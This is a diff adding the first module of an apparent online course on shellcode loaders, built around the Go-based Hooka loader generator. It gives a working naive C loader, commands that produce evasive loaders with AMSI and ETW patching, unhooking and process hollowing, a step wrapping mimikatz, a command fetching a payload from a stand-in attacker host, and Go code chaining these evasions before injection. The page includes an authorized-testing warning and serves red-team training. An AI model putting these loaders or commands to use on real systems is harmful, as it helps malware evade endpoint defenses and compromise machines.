@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 1: Introduction to Shellcode Loaders - Hooka Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1FA9D;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#4ade80;--accent2:#2dd4bf;--gradient:linear-gradient(135deg,#4ade80,#2dd4bf)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Hooka Course</h2>
+<span>Shellcode Loader Generator</span>
+</div>
+<a class="home-link" href="../Hooka_index.html">&larr; Course Home</a>
+<a class="mod-link active" href="module1.html"><span>1. Intro to Shellcode Loaders</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Injection Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Syscalls &amp; Gate Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Unhooking &amp; Patching</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Sandbox &amp; Process Protection</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Encryption &amp; Obfuscation</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. The Hooka Go Library</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. CLI Generator &amp; Full Chain</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge easy">Difficulty: Beginner</span>
+<h1>Module 1: Introduction to Shellcode Loaders</h1>
+<p class="subtitle">Generate, evade, inject, execute &mdash; the four-word story of every loader.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>This module introduces the concept of shellcode loaders, explains why they exist in the context of modern endpoint security, and provides a comprehensive overview of <strong>Hooka</strong> &mdash; a Go-based shellcode loader generator and library by <strong>D3Ext</strong>. By the end, you will understand the loader lifecycle, the detection layers loaders must defeat, and how Hooka compares to other popular tools in the space.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. What Is a Shellcode Loader?</h2>
+
+<p>A <strong>shellcode loader</strong> is a program whose sole purpose is to take raw shellcode (position-independent machine code), place it into executable memory, and transfer control to it. The shellcode itself typically establishes a C2 channel (e.g., a Cobalt Strike Beacon or Meterpreter session), but it cannot run on its own &mdash; it needs a host process and memory to live in.</p>
+
+<p>Every shellcode loader follows a <strong>three-stage lifecycle</strong>:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">The Shellcode Loader Lifecycle</h4>
+<div class="flow">
+<div class="flow box">1. Generate Shellcode<br><small>msfvenom, Cobalt Strike, Sliver, etc.</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">2. Prepare Evasion<br><small>Encrypt, obfuscate, unhook, patch</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">3. Inject &amp; Execute<br><small>Allocate memory, write, run</small></div>
+</div>
+</div>
+
+<p>Stage 1 produces the raw payload. Stage 2 wraps it in layers of protection so it survives the gauntlet of security products. Stage 3 gets the shellcode into memory and hands off execution. A loader is only as good as the weakest link in this chain.</p>
+
+<div class="card">
+<h4>The Simplest Possible Loader</h4>
+<p>At its most basic, a loader allocates RWX memory, copies shellcode into it, and calls it as a function pointer. This works but is trivially detected:</p>
+<pre><span class="lang-tag">C</span>// Naive loader - detected by every AV/EDR
+unsigned char shellcode[] = { 0xfc, 0x48, 0x83, ... };
+
+void* mem = VirtualAlloc(NULL, sizeof(shellcode),
+    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(mem, shellcode, sizeof(shellcode));
+((void(*)())mem)();  // jump to shellcode</pre>
+<p>This approach fails because: (a) the shellcode bytes are visible in the binary, (b) RWX memory is a red flag, (c) <code>VirtualAlloc</code> with execute permissions triggers EDR hooks, and (d) there is no obfuscation or evasion whatsoever.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. Why Loaders Exist: EDR Detection Layers</h2>
+
+<p>Modern Endpoint Detection and Response (EDR) solutions deploy <strong>multiple overlapping detection layers</strong>. A loader must survive all of them, not just one:</p>
+
+<table>
+<tr><th>Detection Layer</th><th>When It Fires</th><th>What It Looks For</th><th>Loader's Counter</th></tr>
+<tr><td><strong>Static Scanning</strong></td><td>On disk, before execution</td><td>Known signatures, suspicious byte patterns, high entropy sections</td><td>Encryption, obfuscation, code signing</td></tr>
+<tr><td><strong>Dynamic Analysis</strong></td><td>During execution in sandbox</td><td>API call sequences, process behavior, network callbacks</td><td>Sandbox detection, delayed execution, anti-debug</td></tr>
+<tr><td><strong>Behavioral Monitoring</strong></td><td>Runtime, continuous</td><td>Suspicious API chains (alloc &rarr; write &rarr; exec), process injection patterns</td><td>Syscalls, unhooking, callback-based execution</td></tr>
+<tr><td><strong>Memory Scanning</strong></td><td>Periodic or on-demand</td><td>RWX pages, unbacked executable memory, known shellcode patterns</td><td>No-RWX, sleep encryption, permission toggling</td></tr>
+</table>
+
+<div class="card warn">
+<h4>The Fundamental Problem</h4>
+<p>Shellcode in memory is inherently suspicious. Raw machine code sitting in a newly allocated memory region with execute permissions does not look like normal program behavior. Every serious loader must address this by combining <strong>encryption</strong> (hide the payload on disk and in memory), <strong>injection techniques</strong> (avoid obvious allocation patterns), and <strong>unhooking</strong> (remove the EDR's ability to observe API calls).</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Introducing Hooka</h2>
+
+<p><strong>Hooka</strong> is a Go-based shellcode loader generator and library created by <strong>D3Ext</strong>. What makes Hooka unique is its <strong>dual-purpose architecture</strong>: it functions both as a <strong>CLI tool</strong> that generates complete loader executables and as a fully <strong>importable Go package</strong> (<code>pkg/hooka</code>) with 40+ exported functions that you can use in your own custom tooling.</p>
+
+<div class="card green">
+<h4>Key Differentiator</h4>
+<p>Most tools in this space are either a CLI generator (like ScareCrow) or a code library. Hooka is <strong>both</strong>. You can use the CLI for quick loader generation, or import the library for surgical control over individual techniques. The library exposes every injection method, encryption algorithm, syscall helper, and evasion function as a standalone, reusable Go function.</p>
+</div>
+
+<h3>How Hooka Works at a High Level</h3>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Hooka Generation Pipeline</h4>
+<div class="flow">
+<div class="flow box">Input<br><small>.bin / PE / DLL / URL</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Encrypt<br><small>AES / 3DES / RC4 / XOR</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Wrap Injection<br><small>6 CLI / 14 lib methods</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Add Evasion<br><small>Unhook, AMSI, ETW, sandbox</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Output<br><small>EXE or DLL</small></div>
+</div>
+</div>
+
+<p>The CLI accepts shellcode from a file, a PE executable (converts to shellcode via sRDI), a DLL (also sRDI-converted), or a remote URL. It then applies the selected encryption algorithm, wraps the decryption-and-injection logic in Go source code using the chosen technique, layers on evasion features, and compiles the result into a Windows EXE or DLL.</p>
+
+<!-- ============================================================ -->
+<h2>4. Feature Overview</h2>
+
+<p>Hooka packs an extensive feature set into a single tool. Here is a summary of its major capabilities:</p>
+
+<table>
+<tr><th>Category</th><th>Feature</th><th>Count / Details</th></tr>
+<tr><td><strong>Injection (CLI)</strong></td><td>SuspendedProcess, ProcessHollowing, NtCreateThreadEx, EtwpCreateEtwThread, NtQueueApcThreadEx, QueueUserApc</td><td>6 methods</td></tr>
+<tr><td><strong>Injection (Library)</strong></td><td>All CLI methods + CreateRemoteThread, RtlCreateUserThread, UuidFromString, Fibers, EnumSystemLocales, Callbacks, Halo's Gate variants, and more</td><td>14 methods</td></tr>
+<tr><td><strong>Encryption</strong></td><td>AES-256-CFB, 3DES-CFB, RC4, XOR</td><td>4 algorithms</td></tr>
+<tr><td><strong>Unhooking</strong></td><td>Classic (per-function), Full DLL (.text replacement), Perun's Fart (ntdll)</td><td>3 methods</td></tr>
+<tr><td><strong>Sandbox Detection</strong></td><td>CPU count, RAM size, disk size, hostname, drivers, processes, username, domain-joined, internet connectivity</td><td>9 checks</td></tr>
+<tr><td><strong>Patching</strong></td><td>AMSI (2 methods), ETW (2 methods)</td><td>4 patches</td></tr>
+<tr><td><strong>Process Protection</strong></td><td>ACG Guard, BlockDLLs policy, Phant0m (EventLog thread kill)</td><td>3 features</td></tr>
+<tr><td><strong>Other</strong></td><td>API hashing (MD5/SHA1/SHA256), code signing, sRDI conversion, custom sleep, Shikata Ga Nai encoding</td><td>Various</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>5. Hooka vs The Competition</h2>
+
+<p>Several other tools occupy the same space as Hooka. This comparison highlights where each tool excels:</p>
+
+<table class="versus">
+<tr><th>Feature</th><th>Hooka</th><th>ScareCrow</th><th>Freeze</th><th>Shhhloader</th></tr>
+<tr><td><strong>Language</strong></td><td>Go</td><td>Go</td><td>Go</td><td>Python (generates Nim/C#)</td></tr>
+<tr><td><strong>Output Formats</strong></td><td>EXE, DLL</td><td>EXE, DLL, JS, HTA, CPL</td><td>EXE, DLL</td><td>EXE</td></tr>
+<tr><td><strong>Injection Methods</strong></td><td>6 CLI / 14 library</td><td>3</td><td>2 (CreateThread, shellcode)</td><td>3</td></tr>
+<tr><td><strong>Encryption</strong></td><td>AES, 3DES, RC4, XOR</td><td>AES</td><td>None (obfuscation-based)</td><td>AES, XOR</td></tr>
+<tr><td><strong>Unhooking</strong></td><td>3 methods (Classic, Full, Perun's)</td><td>1 (disk-based)</td><td>Suspended process (avoids hooks)</td><td>1 (syscalls)</td></tr>
+<tr><td><strong>Syscalls</strong></td><td>Direct + Hell/Halo/Tartarus Gate</td><td>Indirect syscalls</td><td>Indirect syscalls</td><td>SysWhispers</td></tr>
+<tr><td><strong>Sandbox Detection</strong></td><td>9 checks</td><td>Domain-check only</td><td>None</td><td>Limited</td></tr>
+<tr><td><strong>Importable Library</strong></td><td>Yes (40+ functions)</td><td>No</td><td>No</td><td>No</td></tr>
+<tr><td><strong>Unique Feature</strong></td><td>Full Go library + API hashing + Phant0m</td><td>Code signing + multiple output formats</td><td>Minimal footprint + suspended process focus</td><td>Nim/C# polyglot output</td></tr>
+</table>
+
+<div class="card highlight">
+<h4>Why Choose Hooka?</h4>
+<p>Hooka's primary advantage is flexibility. If you need a quick loader, the CLI generates one in seconds. If you are building custom tooling and need a specific injection technique combined with a specific encryption algorithm and custom evasion logic, you import the Go library and call exactly the functions you need. No other tool in this comparison offers both modes of operation.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. Source Code Structure</h2>
+
+<p>Understanding Hooka's repository layout helps you navigate the codebase for the rest of this course:</p>
+
+<pre><span class="lang-tag">Text</span>Hooka/
++-- cmd/
+|   +-- hooka/
+|       +-- main.go          # CLI entry point, flag parsing
+|       +-- banner.go        # ASCII banner and version info
++-- pkg/
+|   +-- hooka/
+|       +-- hooka.go         # Core loader generation logic
+|       +-- injection.go     # All injection technique implementations
+|       +-- syscalls.go      # Direct syscalls, SSN resolution
+|       +-- gates.go         # Hell's Gate, Halo's Gate, Tartarus' Gate
+|       +-- unhook.go        # Classic, Full DLL, Perun's Fart unhooking
+|       +-- patching.go      # AMSI and ETW patching functions
+|       +-- sandbox.go       # All 9 sandbox detection checks
+|       +-- encryption.go    # AES, 3DES, RC4, XOR implementations
+|       +-- hashing.go       # API hashing (MD5, SHA1, SHA256)
+|       +-- process.go       # Process enumeration, Phant0m
+|       +-- utils.go         # Helper functions
+|       +-- evasion.go       # ACG Guard, BlockDLLs, sleep
+|       +-- srdi.go          # Shellcode Reflective DLL Injection
+|       +-- signing.go       # Code signing utilities
+|       +-- types.go         # Struct definitions and constants
+|       +-- callbacks.go     # Callback-based execution methods
++-- examples/                # Example usage of the Go library
++-- build/                   # Build scripts and Makefile
++-- go.mod                   # Go module definition
++-- go.sum                   # Dependency checksums</pre>
+
+<p>The <code>pkg/hooka/</code> directory contains <strong>16 source files</strong> and is where all the real logic lives. Each file groups related functionality, making it straightforward to find the implementation of any specific technique.</p>
+
+<div class="card">
+<h4>The maldev Companion Library</h4>
+<p>Hooka depends on <strong>github.com/D3Ext/maldev</strong>, a separate Go library by the same author that provides low-level Windows API wrappers, PE parsing utilities, and helper functions. When you see Hooka calling functions like <code>maldev.GetPEB()</code> or <code>maldev.ReadRemoteMemory()</code>, those come from this companion library. Understanding maldev is not required for this course but can be helpful for deeper exploration.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. Setting Up Your Lab</h2>
+
+<p>Before proceeding to hands-on modules, ensure you have a suitable environment:</p>
+
+<div class="card green">
+<h4>Lab Requirements</h4>
+<ul>
+<li><strong>Go 1.20+</strong> installed (Hooka is written in Go and requires the Go toolchain for compilation)</li>
+<li><strong>Windows VM</strong> for testing generated loaders (preferably Windows 10/11 with Defender disabled or in test mode)</li>
+<li><strong>Linux/macOS host</strong> for running the Hooka CLI (cross-compilation to Windows is supported)</li>
+<li><strong>Git</strong> to clone the repository: <code>git clone https://github.com/D3Ext/Hooka</code></li>
+<li><strong>Shellcode source</strong> (msfvenom, Sliver, or any C2 framework that outputs raw shellcode)</li>
+</ul>
+</div>
+
+<pre><span class="lang-tag">Bash</span># Clone and build Hooka
+git clone https://github.com/D3Ext/Hooka
+cd Hooka
+go build -o hooka ./cmd/hooka/
+
+# Verify installation
+./hooka --help
+
+# Generate test shellcode with msfvenom
+msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin</pre>
+
+<div class="card warn">
+<h4>Safety Warning</h4>
+<p>All techniques in this course are intended for authorized security testing, red team operations, and educational purposes only. Never use shellcode loaders against systems you do not have explicit written permission to test. Generated loaders should only be executed in isolated lab environments.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. Quick Start: Your First Loader</h2>
+
+<p>To illustrate how Hooka works end-to-end, here is the simplest possible CLI invocation that generates a working loader:</p>
+
+<pre><span class="lang-tag">Bash</span># Generate a calc.exe shellcode payload
+msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
+
+# Generate a loader with default settings:
+#   Injection: SuspendedProcess
+#   Encryption: AES
+#   AMSI patching: enabled
+#   ETW patching: enabled
+./hooka -i calc.bin -o loader.exe
+
+# Or generate a DLL instead of an EXE
+./hooka -i calc.bin -o loader.dll --dll
+
+# Use process hollowing with RC4 encryption
+./hooka -i calc.bin -o loader.exe -t ProcessHollowing -e rc4
+
+# Enable API hashing for additional stealth
+./hooka -i calc.bin -o loader.exe --hashing
+
+# Convert a PE executable to shellcode (sRDI) and wrap it
+./hooka -i mimikatz.exe -o loader.exe --pe
+
+# Load shellcode from a remote URL
+./hooka -i http://attacker.com/payload.bin -o loader.exe --url</pre>
+
+<div class="card">
+<h4>What Happens Under the Hood</h4>
+<p>When you run <code>./hooka -i calc.bin -o loader.exe</code>, Hooka performs these steps internally:</p>
+<ol>
+<li>Reads the raw shellcode from <code>calc.bin</code></li>
+<li>Generates a random AES-256 key and encrypts the shellcode</li>
+<li>Produces Go source code that embeds the encrypted shellcode, the key, and the decryption routine</li>
+<li>Adds AMSI patching code (calls <code>PatchAmsi()</code> at startup)</li>
+<li>Adds ETW patching code (calls <code>PatchEtw()</code> at startup)</li>
+<li>Wraps the decrypted shellcode in the SuspendedProcess injection technique</li>
+<li>Cross-compiles the Go source to a Windows PE executable</li>
+<li>Writes the final binary to <code>loader.exe</code></li>
+</ol>
+</div>
+
+<p>The generated executable is a standalone Windows binary with no external dependencies. When executed on the target, it patches AMSI, patches ETW, decrypts the shellcode in memory, creates a suspended process, writes the shellcode, and resumes the thread.</p>
+
+<!-- ============================================================ -->
+<h2>9. Using Hooka as a Go Library</h2>
+
+<p>Beyond the CLI, you can import Hooka as a Go package and call individual functions. This is the <strong>library mode</strong> that sets Hooka apart from every other tool in its class:</p>
+
+<pre><span class="lang-tag">Go</span>package main
+
+import (
+    "fmt"
+    "os"
+    "github.com/D3Ext/Hooka/pkg/hooka"
+)
+
+func main() {
+    // Read raw shellcode
+    sc, _ := os.ReadFile("calc.bin")
+
+    // Encrypt with AES
+    key := hooka.RandomBytes(32)
+    encrypted, _ := hooka.AesEncrypt(sc, key)
+
+    // Patch AMSI and ETW before doing anything suspicious
+    hooka.PatchAmsi()
+    hooka.PatchEtw()
+
+    // Unhook ntdll to remove EDR visibility
+    hooka.PerunsUnhook()
+
+    // Decrypt and inject
+    decrypted, _ := hooka.AesDecrypt(encrypted, key)
+    hooka.NtCreateThreadEx(decrypted)
+
+    fmt.Println("Shellcode executed")
+}</pre>
+
+<div class="card green">
+<h4>Library Advantages</h4>
+<p>The library mode lets you mix and match techniques that the CLI does not support. For example, you could combine Fibers injection with 3DES encryption and Perun's Fart unhooking &mdash; a combination not available through the CLI flags. You can also integrate Hooka's functions into larger tooling frameworks, red team automation pipelines, or custom C2 implant builders.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>10. Course Roadmap</h2>
+
+<p>This course is structured to build understanding progressively. Here is what each module covers and why the order matters:</p>
+
+<div class="card">
+<h4>Module Progression</h4>
+<table>
+<tr><th>Module</th><th>Topic</th><th>Why It's Here</th></tr>
+<tr><td>1 (this)</td><td>Introduction &amp; Overview</td><td>Foundation: understand the problem space and tool landscape</td></tr>
+<tr><td>2</td><td>Injection Techniques</td><td>Core skill: how shellcode gets into memory and executes</td></tr>
+<tr><td>3</td><td>Syscalls &amp; Gates</td><td>Evasion foundation: bypassing userland hooks at the API level</td></tr>
+<tr><td>4</td><td>Unhooking &amp; Patching</td><td>Active evasion: removing EDR hooks and disabling telemetry</td></tr>
+<tr><td>5</td><td>Sandbox &amp; Process Protection</td><td>Environmental evasion: detecting analysis and protecting the process</td></tr>
+<tr><td>6</td><td>Encryption &amp; Obfuscation</td><td>Payload protection: hiding shellcode from static and memory analysis</td></tr>
+<tr><td>7</td><td>The Hooka Go Library</td><td>Integration: using pkg/hooka programmatically for custom tools</td></tr>
+<tr><td>8</td><td>CLI Generator &amp; Full Chain</td><td>Mastery: combining everything into real-world loader generation</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: What are the three stages of the shellcode loader lifecycle?</p>
+<div class="quiz-btn" data-choice="A">A) Compile, link, execute</div>
+<div class="quiz-btn" data-choice="B">B) Generate shellcode, prepare evasion, inject and execute</div>
+<div class="quiz-btn" data-choice="C">C) Encrypt, decrypt, allocate</div>
+<div class="quiz-btn" data-choice="D">D) Download, unpack, run</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q2: What makes Hooka unique compared to tools like ScareCrow and Freeze?</p>
+<div class="quiz-btn" data-choice="A">A) It is written in Rust for maximum performance</div>
+<div class="quiz-btn" data-choice="B">B) It only supports process hollowing injection</div>
+<div class="quiz-btn" data-choice="C">C) It functions as both a CLI generator and an importable Go library with 40+ functions</div>
+<div class="quiz-btn" data-choice="D">D) It generates JavaScript-based loaders for browser exploitation</div>
+</div>
+
+<div class="quiz-q" data-answer="D">
+<p>Q3: Which EDR detection layer inspects memory at runtime for RWX pages and shellcode patterns?</p>
+<div class="quiz-btn" data-choice="A">A) Static scanning</div>
+<div class="quiz-btn" data-choice="B">B) Dynamic analysis</div>
+<div class="quiz-btn" data-choice="C">C) Behavioral monitoring</div>
+<div class="quiz-btn" data-choice="D">D) Memory scanning</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<span></span>
+<a class="primary" href="module2.html">Next: Injection Techniques &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
